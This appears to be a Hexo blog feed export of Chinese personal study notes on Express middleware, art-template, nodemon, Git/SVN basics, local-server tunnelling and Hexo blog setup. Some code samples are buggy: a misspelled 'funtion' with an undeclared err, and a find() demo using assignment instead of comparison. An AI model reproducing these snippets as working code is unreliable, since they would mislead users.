class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/a'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">fs.readFile(<span class="string">'.a/bc'</span>, funtion() &#123;</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="comment">// 当调用next()传参后，则直接进入到全局错误处理中间件方法中</span></span><br><span class="line">        <span class="comment">// 当发生全局错误的时候，我们可以调用next传递错误对象</span></span><br><span class="line">        <span class="comment">// 然后被全局错误处理中间件匹配到并进行处理</span></span><br><span class="line">next(err);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//全局错误处理中间件</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err,req,res,next</span>)</span>&#123;</span><br><span class="line">    res.status(<span class="number">500</span>).json(&#123;</span><br><span class="line">        err_code:<span class="number">500</span>,</span><br><span class="line">        message:err.message</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="内置中间件"><a href="#内置中间件" class="headerlink" title="内置中间件"></a>内置中间件</h2><ul><li>express.static(提供静态文件)<ul><li><a href="http://expressjs.com/en/starter/static-files.html#serving-static-files-in-express" target="_blank" rel="noopener">http://expressjs.com/en/starter/static-files.html#serving-static-files-in-express</a></li></ul></li></ul><h2 id="第三方中间件"><a href="#第三方中间件" class="headerlink" title="第三方中间件"></a>第三方中间件</h2><blockquote><p>参考文档：<a href="http://expressjs.com/en/resources/middleware.html" target="_blank" rel="noopener">http://expressjs.com/en/resources/middleware.html</a></p></blockquote><ul><li>body-parser</li><li>compression</li><li>cookie-parser</li><li>mogran</li><li>response-time</li><li>server-static</li><li>session</li></ul><h1 id="art-template搭配dateformat模块"><a href="#art-template搭配dateformat模块" class="headerlink" title="art-template搭配dateformat模块"></a>art-template搭配dateformat模块</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>art-template搭配dateFormat实现将时间戳格式化为你想要的日期格式</p><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>npm下载对应模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save dateformat</span><br></pre></td></tr></table></figure></li><li><p>页面代码（注意art-template默认渲染的页面后缀名为art，time为渲染的时间数据，’yyyy-mm-dd’为你要定义的时间格式）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; dateFormat(time, 'yyyy-mm-dd')&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>node引用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="built_in">require</span>(<span class="string">'art-template'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> dateFormat = <span class="built_in">require</span>(<span class="string">'dateformat'</span>);</span><br></pre></td></tr></table></figure></li><li><p>配置模板引擎</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template.defaults.imports.dateFormat = dateFormat;</span><br></pre></td></tr></table></figure></li><li><p>渲染页面并打出在cmd控制台</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> html = template(<span class="string">'06.art'</span>, &#123;</span><br><span class="line">    time: <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(html)</span><br></pre></td></tr></table></figure></li></ol><h1 id="其它-2"><a href="#其它-2" class="headerlink" title="其它"></a>其它</h1><h2 id="nodemon"><a href="#nodemon" class="headerlink" title="nodemon"></a>nodemon</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>修改完代码自动重启</p><h3 id="安装-5"><a href="#安装-5" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global nodemon</span><br></pre></td></tr></table></figure><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nodemon 文件</span><br></pre></td></tr></table></figure><h2 id="ES6函数"><a href="#ES6函数" class="headerlink" title="ES6函数"></a>ES6函数</h2><h3 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h3><p>方法返回数组中满足提供的测试函数的第一个元素的值。否则返回 <code>undefined</code></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.findme = <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(callback(<span class="keyword">this</span>[i],i))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>[i]</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(abc.findme(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> item.id = <span class="number">3</span></span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h3 id="findIndex"><a href="#findIndex" class="headerlink" title="findIndex()"></a>findIndex()</h3><p>返回数组中满足提供的测试函数的第一个元素的<strong>索引</strong></p><h2 id="隐藏元素控件"><a href="#隐藏元素控件" class="headerlink" title="隐藏元素控件"></a>隐藏元素控件</h2><p>用来放一些不希望被用户看见，但是需要被提交到服务端的数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; student.id &#125;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="/2020/07/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%8C%E5%A4%96%E7%BD%91%E6%98%A0%E5%B0%84%E6%8A%80%E6%9C%AF/"/>
      <url>/2020/07/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%8C%E5%A4%96%E7%BD%91%E6%98%A0%E5%B0%84%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>为了能验证自己的搭建的疫情地图（nodejs）是否可行，以及想展示自己的成果（哈哈哈），便萌生了通过外网如何访问自己电脑的想法，然后找到了主要有以下几种办法</p><ol><li><p>github page类似的服务。（在研究中）</p></li><li><p>自己主机，搭建服务器映射外网。（可能行，难度也有）</p></li><li><p>花钱买域名，买服务器。（目前没那钱）</p></li></ol><p>然后我想到了第二种，试了路由器映射端口，结果自家的路由找不到那个设置，？？？，百度了很多，结果找到了利用内网穿透技术的软件，花生壳、网云穿、ngrok等等</p><p>这里我使用了网云穿<a href="http://xiaomy.net/" target="_blank" rel="noopener">http://xiaomy.net/</a></p><ol><li>下载客户端</li><li>注册用户</li><li>开通隧道（这里只能映射一个端口，？？？，本来疫情地图（arcgis server＋页面）是要映射两个端口，结果只能映射一个，所以我就使用了自己做的论坛去映射一个端口，尝试一下）</li></ol><p>详细的使用方法可以去官网看</p><p>接下来，就是开启node服务和映射需要外网访问的端口号了</p><p>node启动服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nodemon app.js</span><br></pre></td></tr></table></figure><p>打开网云穿，将需要映射的端口填入（没有图）</p><p>然后外网就可以访问啦</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git初识</title>
      <link href="/2020/07/02/Git/"/>
      <url>/2020/07/02/Git/</url>
      
        <content type="html"><![CDATA[<h1 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h1><blockquote><p>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理。通俗的讲，就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理</p></blockquote><p>注意：这里，我只做了基础的了解，了解一些概念和看了一些操作，实操没有，等到需要我会再来补全</p><p>具体学习：<a href="http://www.runoob.com/svn/svn-tutorial.html" target="_blank" rel="noopener">菜鸟教程 - SVN 教程</a></p><h2 id="解决以下问题"><a href="#解决以下问题" class="headerlink" title="解决以下问题"></a>解决以下问题</h2><ol><li>保存项目历史记录</li><li>提供多人协作</li></ol><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>记录一款软件添加或更改源代码的过程</li><li>回滚到特定阶段，恢复误删除的文件</li><li>合并多人协作的文件等</li><li>多人协同，文件传输</li></ul><h2 id="集中式的优缺点"><a href="#集中式的优缺点" class="headerlink" title="集中式的优缺点"></a>集中式的优缺点</h2><p><img src= "/img/loading.gif" data-src="/2020/07/02/Git/%E9%9B%86%E4%B8%AD%E5%BC%8F-1613877214813-1616206817340.png" alt="集中式"></p><ul><li>优点：每个人都可以一定程度上看到项目中的其他人正在做些什么。而管理员也可以轻松掌控每个开发者的权限。</li><li>缺点： 过分依赖中央处理器，若中央处理气出现问题，则会导致整个项目的停滞甚至丢失，所以，为了以防中央处理器出现问题，数据还是得做好备份</li></ul><h2 id="SVN的一些术语"><a href="#SVN的一些术语" class="headerlink" title="SVN的一些术语"></a>SVN的一些术语</h2><ul><li><strong>repository（源代码库）:</strong>源代码统一存放的地方</li><li><strong>Checkout（提取）:</strong>当你手上没有源代码的时候，你需要从repository checkout一份</li><li><strong>Commit（提交）:</strong>当你已经修改了代码，你就需要Commit到repository</li><li><strong>Update (更新):</strong>当你已经Checkout了一份源代码， Update一下你就可以和Repository上的源代码同步，你手上的代码就会有最新的变更</li></ul><h2 id="SVN服务端版本（VisualSVN）"><a href="#SVN服务端版本（VisualSVN）" class="headerlink" title="SVN服务端版本（VisualSVN）"></a>SVN服务端版本（VisualSVN）</h2><p>官网：<a href="https://www.visualsvn.com/" target="_blank" rel="noopener">https://www.visualsvn.com/</a></p><p>下载：下载server版本</p><img src= "/img/loading.gif" data-src="/2020/07/02/Git/image-20200630155127616.png" alt="image-20200630155127616" style="zoom:50%;"><h2 id="SVN客户端版本（TortoiseSVN）"><a href="#SVN客户端版本（TortoiseSVN）" class="headerlink" title="SVN客户端版本（TortoiseSVN）"></a>SVN客户端版本（TortoiseSVN）</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>使用教程：<a href="https://www.runoob.com/svn/svn-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/svn/svn-tutorial.html</a></p><ul><li>检出项目：<code>checkout</code><ul><li>在没有源代码的前提下，需要通过 tortoise-svn 客户端下载</li></ul></li><li>提交修改：<code>commit</code><ul><li>帮你记录当前开发的软件的状态</li></ul></li><li>更新文件或目录：<code>update</code>（更新）<ul><li>别的开发人员在已有源代码的前提下可以通过 update 更新服务器上最新的版本</li></ul></li><li>查看版本日志：<code>show log</code>（日志）</li><li>锁定文件： totoriseSVN → Get Lock，若修改完文件不想让他人修改可使用该选项</li></ul><h3 id="关于冲突"><a href="#关于冲突" class="headerlink" title="关于冲突"></a>关于冲突</h3><p>当两个程序员在同时修改同个版本号的代码时</p><ol><li>当修改的是不同代码时，可以通过SVN的update自动合并修改</li><li>当修改的是同行代码时，可以通过SVN的提示文件conflict，手动确定<ul><li>操作：update→双击报错的同行代码信息→和另一位程序员讨论确定</li></ul></li></ol><p>良好的习惯：</p><ul><li>提交之前，先更新（每次 commit 之前都要 update）</li><li>一个文件最好同一时间只被一个人修改提交</li><li>多跟团队成员沟通</li><li>不要随便去修改别人的文件</li><li>每次 commit 的时候都务必要写提交日志</li><li>不要频繁的提交版本<ul><li>一般有比较成熟的功能模块的时候，再去提交</li><li>修复了功能性 bug 的时候再去提交，最好不存在其它bug</li></ul></li></ul><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="cmd操作"><a href="#cmd操作" class="headerlink" title="cmd操作"></a>cmd操作</h2><ul><li>mkdir 目录名（在当前目录创建文件夹）</li><li>cd 目录名 （转到指定目录）</li><li>ls （查看当前目录文件）</li><li>ls -a （查看当前目录包含隐藏文件）</li><li>clear （清屏）</li><li>rmdir 空目录名（移除空目录）</li><li>rm -rf 目录名 （移除目录，包括里面的数据）</li><li>rm 文件 （移除文件）</li></ul><h2 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h2><h3 id="基础操作-1"><a href="#基础操作-1" class="headerlink" title="基础操作"></a>基础操作</h3><ul><li>git init （初始化仓库）</li><li>git status （检查文件，仓库状态）</li><li>git add 文件名.文件后缀（添加文件至暂存区）</li><li>git commit -m “更新记录” （提交）</li><li>git log （查看日志）</li><li>gitk （图形界面）-patch（差异）</li></ul><h3 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h3><ul><li>git config –global user.name “账户名” （绑定账户）</li><li>git config –global user.email “绑定邮箱” （绑定账户）</li><li>git clone GitHub仓库地址 （加载到本地仓库）</li><li>git remote add 自定义仓库标识名 仓库地址 （连接GitHub仓库）</li><li>git remote show （显示连接的仓库）</li><li>git remote show 仓库标识名 （显示仓库信息）</li><li>git push 仓库标识名 main（推送到远程仓库）</li><li>git push –set -unstream 仓库名 main（设置默认push仓库名）</li><li>git remote remove 仓库标识名 （移除仓库）</li><li>git pull 仓库标识名 分支名 （从远程仓库获取代码并合并版本）</li><li>git push -f  (强制上传)</li></ul><h3 id="文件编辑操作"><a href="#文件编辑操作" class="headerlink" title="文件编辑操作"></a>文件编辑操作</h3><ul><li>vi 文件名 （用vi文本编辑器打开当前文件）<ul><li>:q（退出该编辑器）</li><li>:光标+i（在光标处开启编辑）</li><li>ESC （退出编辑）</li><li>:w （保存）</li><li>:wq（保存并退出）</li></ul></li><li>git commit  –amend（修改最近一次历史版本提交日志）</li><li>git add 文件夹名/ （将该文件夹所有文件放入暂存区）</li><li>git add –all （将当前目录下所有文件放入暂存区）</li><li>git rm 文件名 （从本地仓库移除文件）</li><li>git mv 原文件名 新文件名 （修改文件名）</li><li>git rm –cashed 文件名</li><li>git commit -a （越过暂存区直接到仓库）</li><li>git checkout – 文件 （恢复并覆盖最近一次暂存区的文件到工作区）</li><li>git reset –hard 版本id号（回退版本）</li></ul><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><ul><li>git branch （查看分支）</li><li>git branch 分支名 （新建分支）</li><li>git ·checkout -b 分支名 （新建并切换到该分支）</li><li>git checkout 分支名 （切换分支）</li><li>git checkout - （切换到上个分支）</li><li>git merge 分支名 （合并指定分支到当前分支）</li><li>git branch -d 分支名 （删除分支）</li><li>git branch 新分支 已存在分支 （基于分支创建新分支）</li></ul><h3 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/mtk/ 过滤整个文件夹</span><br><span class="line">*.<span class="built_in">zip</span> 过滤所有.<span class="built_in">zip</span>文件</span><br><span class="line">/mtk/<span class="keyword">do</span>.<span class="built_in">c</span> 过滤某个具体文件</span><br><span class="line">mtk 直接过滤该文件夹</span><br></pre></td></tr></table></figure><h4 id="忽略过滤"><a href="#忽略过滤" class="headerlink" title="忽略过滤"></a>忽略过滤</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!src/   不过滤该文件夹</span><br><span class="line">!*.<span class="built_in">zip</span>   不过滤所有.<span class="built_in">zip</span>文件</span><br><span class="line">!/mtk/<span class="keyword">do</span>.<span class="built_in">c</span> 不过滤该文件</span><br></pre></td></tr></table></figure><h2 id="git（本地）推送远程仓库流程"><a href="#git（本地）推送远程仓库流程" class="headerlink" title="git（本地）推送远程仓库流程"></a>git（本地）推送远程仓库流程</h2><ol><li><p>首先，绑定github（gitee）账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config –global user.name “账户名” （绑定账户）</span><br><span class="line">git config –global user.email “绑定邮箱” （绑定账户）</span><br></pre></td></tr></table></figure></li><li><p>初始化要push的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init （初始化仓库）</span><br></pre></td></tr></table></figure></li><li><p>添加文件至暂存区并提交，注意这里还是在本地进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add 文件名.文件后缀 /git add . （提交全部）</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m “更新记录” （提交）</span><br></pre></td></tr></table></figure></li><li><p>更改分支名为main</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -m main</span><br></pre></td></tr></table></figure></li><li><p>连接github仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add 自定义仓库标识名 仓库地址</span><br></pre></td></tr></table></figure></li><li><p>推送（必须在有网的前提下）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push 仓库标识名 main</span><br></pre></td></tr></table></figure></li></ol><h2 id="git分支管理策略"><a href="#git分支管理策略" class="headerlink" title="git分支管理策略"></a>git分支管理策略</h2><p>一般大型项目的维护、开发以及发布过程会遵循以下的策略（结合图来理解）</p><p>粉色模块Master是项目用来发布重大版本的分支，它是一个项目的主分支，日常开发所进行的分支则应在develop上进行，相应的功能模块会在基于develop分支上进行创建，功能模块实现并完成了它的任务（功能）并和develop分支合并（merge）后，则可清除该分支（红色曲线）。</p><p>在develop开发到一定程度决定发布后，则可以通过release-<em>（橙色，\</em>代表版本号）分支进行测试，release分支进行项目的运行测试并修改相应bug并确认无误后则可在Master主分支上对release进行合并（merge），同时将无bug版本在develop上也进行合并（merge），之后它便可以光荣退休（红线）了，等待下一个重大的日常版本来再出现。</p><p>Maste主分支在对外发布并运行的过程多多少少（当然能尽量避免就尽量避免）可能会出现一些测试未发现的bug，这时，则可以在它上面新建分支，用来解决对应bug，名称为fixbug-bug名，在对bug进行解决后则可继续合并到主分支，同时合并到develop上去，这时的fixbug也可以退休（红线）啦。</p><p><img src= "/img/loading.gif" data-src="/2020/07/02/Git/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E7%AD%96%E7%95%A5-1593933511479-1613877214813-1616206817340.png" alt="git分支管理策略"></p><p>可以同时参考这篇博客<a href="http://www.ruanyifeng.com/blog/2012/07/git.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/07/git.html</a></p><p>下图是另外一种结构图（图源网络）</p><p><img src= "/img/loading.gif" data-src="/2020/07/02/Git/git%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84%E5%9B%BE-1593934597373-1613877214814-1616206817341.png" alt="git分支结构图"></p><p>总结：如果要清晰完整的开发好一个大型多人合作的项目，做好以下几点</p><ul><li>列好分支清单，统一好分支的命名，不要使分支混乱</li><li>定时合并和清理分支，保证分支的简洁度和项目功能的完整度</li><li>在一个大版本即将发布之时，检查好该版本的功能完整性以及测试是否可以正常运行，尽量少做在发布之时修改bug。</li><li>提交每个版本时要做好清晰的备注</li></ul><h2 id="git工作流程"><a href="#git工作流程" class="headerlink" title="git工作流程"></a>git工作流程</h2><p>参考博客：<a href="http://www.ruanyifeng.com/blog/2015/12/git-workflow.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2015/12/git-workflow.html</a></p><p>以后有用到我会回来补齐，包括Git flow、GitHub flow（更多为开源项目采用）以及GitLab flow（京东、淘宝等大型项目更多采用）</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><ol><li><p>git 提示：error: unable to rewind rpc post data - try increasing http.postBuffer</p><blockquote><p><a href="https://shentuzhigang.blog.csdn.net/article/details/104360878" target="_blank" rel="noopener">解决</a>：大概意思是http.postBuffer太小，需要设置更大的值，项目文件太多太大</p><p>在终端执行</p><p>git config –global http.postBuffer 524288000</p></blockquote></li><li><p>error: RPC failed; curl 56 OpenSSL SSL_read: error:140943FC:SSL routines:ssl3_read_bytes:sslv3 alert bad record mac, errno 0</p><blockquote><p><a href="https://www.icode9.com/content-3-229103.html" target="_blank" rel="noopener">解决</a>：<code>git config http.sslVersion tlsv1.2</code></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> SVN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+GitHub+Gitee搭建静态博客</title>
      <link href="/2020/07/01/Hexo/"/>
      <url>/2020/07/01/Hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>鉴于没钱买服务器，没钱买域名，所以一直没能实现搭建自己个人网站的机会。然后就在一个偶然的时间点，偶然的地点，我刷到了一个别人基于github搭建的hexo静态博客，顿时心血来潮，哇，这也太好看了吧，这不就是我梦寐以求的个人博客吗，最终在各路的教程下，折腾了几天后，搭建了一个属于自己的个人博客，好的，然后整理了一下自己的搭建过程，下面进入正题</p><h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>官网：<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">https://hexo.io/zh-cn/</a></p><p>官网首页，这几个字贼大——快速、简洁且高效的博客框架</p><p>打开官方文档，可以看到hexo的相关介绍</p><ul><li><p>Hexo 是一个快速、简洁且高效的博客框架。</p></li><li><p>Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页</p></li></ul><p>本文主要讲如何通过github，将hexo生成的博客托管在它上面，并更改主题以及设置主题和更改样式，最后，鉴于GitHub的访问速度，这里将讲一下如何将博客托管到gitee上（其实，和GitHub差不多的，步骤基本一致）</p><h1 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h1><p>有用过GitHub的同学应该可以跳过这一步了，没有的，来来来，让我领着你们看看什么是Git以及如何安装</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先，丢出一个官网网址——<a href="https://git-scm.com/，下载以及介绍上面都有，当然，是英文的。" target="_blank" rel="noopener">https://git-scm.com/，下载以及介绍上面都有，当然，是英文的。</a></p><p>git简介：</p><ul><li><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p></li><li><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p></li><li><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p></li></ul><p>可能会看不懂，没关系，后面接触Git深了就会懂了，先跳过这个，来到如何安装Git</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630173206443.png" alt="image-20200630173206443"></p><p>从官网下载到你对应系统的版本，然后安装，这里因为外国服务器的原因，下载很慢，然后我在网上找到了另外一个下载的网址，淘宝镜像的下载地址<a href="https://npm.taobao.org/mirrors/git-for-windows/v2.27.0.windows.1/，下载对应的版本即可。" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/git-for-windows/v2.27.0.windows.1/，下载对应的版本即可。</a></p><p>安装的话就一路next，并不复杂</p><p>安装完后打开cmd或者power shell输入git –version，若返回版本号即安装成功，这里git就已经安装好了</p><h1 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h1><p>这里，因为之前自己学的就是node.js，所以，已经安装过了，安装过程有些忘记</p><p>官网：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p><p>中文网： <a href="http://nodejs.cn/" target="_blank" rel="noopener">http://nodejs.cn/</a></p><p>点击这个选项进行下载</p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630203448681.png" alt="image-20200630203448681"></p><p>安装过程一路next</p><p>注意：安装过程中，安装包会将node启动程序添加到系统环境变量path中，所以安装完后要进行检验</p><p>打开cmd，输入<code>node -v</code>，若弹出版本说明安装成功，否则，配置相关的环境变量，详情可以看这篇文章<a href="https://www.jianshu.com/p/13f45e24b1de" target="_blank" rel="noopener">https://www.jianshu.com/p/13f45e24b1de</a></p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630203942938.png" alt="image-20200630203942938"></p><h2 id="连接GitHub"><a href="#连接GitHub" class="headerlink" title="连接GitHub"></a>连接GitHub</h2><p>首先，鼠标右击桌面，点击<code>Git Bath Here</code>输入<code>SSH</code>，检查下ssh是否存在</p><p>检查完后，就可以连接了，分别输入以下关于你GitHub账号的相关内容后分别回车</p><ul><li><p><code>git config --global user.name &quot;GitHub用户名&quot;</code></p></li><li><p><code>git config --global user.email &quot;GitHub绑定邮箱&quot;</code></p></li></ul><p>创建SSH</p><ul><li>ssh-keygen -t rsa -C “GitHub绑定邮箱”</li></ul><ul><li>然后一直回车</li></ul><p>接着，在C:\Users\用户名\.ssh路径下用记事本打开id_rsa.pub文件，将里面的内容复制</p><p>接下来，在自己的GitHub账户下创建一个新仓库用来存放hexo博客相关文件</p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630212220929.png" alt="image-20200630212220929"></p><p>接着，打开设置，添加SSH keys，将复制的内容粘贴进去，单击Add SSH key</p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630212735264.png" alt="image-20200630212735264"></p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200630212952222.png" alt="image-20200630212952222"></p><p>之后，在Bit Bash输入以下内容</p><p><code>ssh -T git@github.com</code></p><p>在弹出提示信息后输入<code>yes</code></p><p>再次输入<code>ssh -T git@github.com</code>检测是否成功（也可能不用）</p><p>弹出<code>Hi，你的用户名......</code>说明成功</p><p>ssh密钥主要是用来解决每次push至GitHub仓库时需要输入账号密码的问题</p><h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>终于到了安装Hexo框架啦</p><p>官网（好像上面有）</p><p>首先，你需要新建一个文件夹用来存放博客相关文件的（博客根目录），文件夹最好是全英文命名，创建好后，在该文件夹下右键，点击Git Bash Here（<strong>接下来所有操作都需要在该目录下进行</strong>）</p><ol><li><p>输入npm install -g hexo-cli</p></li><li><p>初始化博客（官网有详细介绍）</p><p>hexo init</p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></li></ol><blockquote><ul><li><p>_config.yml</p><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a> 信息，您可以在此配置大部分的参数。</p></li><li><p>package.json</p><p>应用程序的信息。您可以自由移除。</p></li><li><p>scaffolds</p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 